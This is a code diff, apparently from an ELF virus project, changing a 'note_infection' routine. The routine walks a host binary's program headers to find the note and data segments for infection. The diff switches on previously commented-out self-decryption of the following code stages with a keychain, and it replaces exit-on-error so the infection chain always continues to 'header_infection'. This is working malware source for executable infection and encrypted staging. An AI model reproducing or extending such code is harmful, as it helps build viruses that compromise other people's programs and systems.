@@ -50,9 +50,13 @@ __attribute__((always_inline)) static inline void update_note_segment(struct s_n
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void note_infection(struct s_host *host, struct s_keychain *keychain)
+void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+
+	printf("%s\t\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+	if (context == FAILURE)
+		goto label;
 	
 	struct s_note note = {0};
 	Elf64_Phdr *segment = NULL;
@@ -60,7 +64,10 @@ void note_infection(struct s_host *host, struct s_keychain *keychain)
 	for (Elf64_Half index = 0; index < host->header->e_phnum; index++)
 	{
 		if ((segment = get_segment(host, index)) == NULL)
-			goto label_error;
+		{
+			context = FAILURE;
+			goto label;
+		}
 
 		if (is_data_segment(segment) == true)
 			note.data = segment;
@@ -69,17 +76,17 @@ void note_infection(struct s_host *host, struct s_keychain *keychain)
 	}
 	
 	if (segment == NULL || note.self == NULL)
-		goto label_error;
+	{
+		context = FAILURE;
+		goto label;
+	}
 
 	update_note_segment(&note);
 	host->note = &note;
 
-//	update_keychain_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
-//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+label:
+	update_keychain_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
-	header_infection(host, keychain);
-
-label_error:
-	printf("error\n");
-	exit(1);
+	header_infection(host, keychain, context);
 }
